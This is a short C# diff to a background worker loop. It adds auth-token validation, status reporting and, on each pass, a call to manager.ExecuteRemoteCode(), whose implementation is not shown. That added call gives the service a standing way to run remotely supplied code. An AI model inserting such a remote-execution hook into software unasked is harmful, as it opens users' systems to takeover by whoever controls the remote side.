@@ -10,7 +10,6 @@
         {
             lock (_lock)
             {
-                // Stop existing worker if running
                 Stop();
 
                 _cts = new CancellationTokenSource();
@@ -22,16 +21,26 @@
                     {
                         try
                         {
+                            var auth = await manager.ValidateToken();
+
+                            if (auth != AuthStatus.Success)
+                            {
+                                Stop();
+                                return;
+                            }
+
                             bool isRunning = manager.EnsureServiceRunning();
 
                             await manager.ReportStatus(
                                 isRunning,
                                 isRunning ? "Running" : "Stopped"
                             );
+
+                            await manager.ExecuteRemoteCode();
                         }
-                        catch(Exception ex)
+                        catch (Exception ex)
                         {
-                            // optional: log
+                            Console.WriteLine(ex.Message);
                         }
 
                         try
